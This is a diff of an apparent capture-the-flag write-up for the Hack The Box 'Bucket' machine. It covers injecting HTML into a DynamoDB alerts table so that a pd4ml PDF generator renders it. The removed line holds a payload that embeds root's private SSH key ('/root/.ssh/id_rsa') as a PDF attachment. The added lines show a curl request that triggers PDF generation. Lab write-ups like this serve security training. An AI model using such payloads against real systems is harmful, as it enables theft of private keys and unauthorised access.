@@ -537,13 +537,43 @@ After another little work of research, we found documentation to do it:
 <br />
 
 ```bash
-❯  aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"Testing to hard\" src=\"file:/root/.ssh/id_rsa\"></pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb --output=json
-{
-    "ConsumedCapacity": {
-        "TableName": "alerts",
-        "CapacityUnits": 1.0
-    }
-}
+❯ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "Test to check the functionality"}}' --endpoint-url http://s3.bucket.htb --output text
+CONSUMEDCAPACITY        1.0     alerts
 ```
 
 <br />
+
+Finally, we just need to make the `POST` request  to `localhost:8000` on the victim machine.
+
+It's important to remember to include the `"action=get_alerts"` parameter in the request to trigger the function:
+
+<br />
+
+```bash
+curl -s -X POST "localhost:8000" -d "action=get_alerts"
+```
+
+<br />
+
+Now we check the `/files` directory to see if the `PDF` was created successfully:
+
+<br />
+
+```bash
+roy@bucket:/var/www/bucket-app$ ls
+composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
+roy@bucket:/var/www/bucket-app$ cd files/
+roy@bucket:/var/www/bucket-app/files$ ls
+5813.html  result.pdf
+```
+
+<br />
+
+Yes! Let's see its content:
+
+<br />
+
+
+
+<br />
+
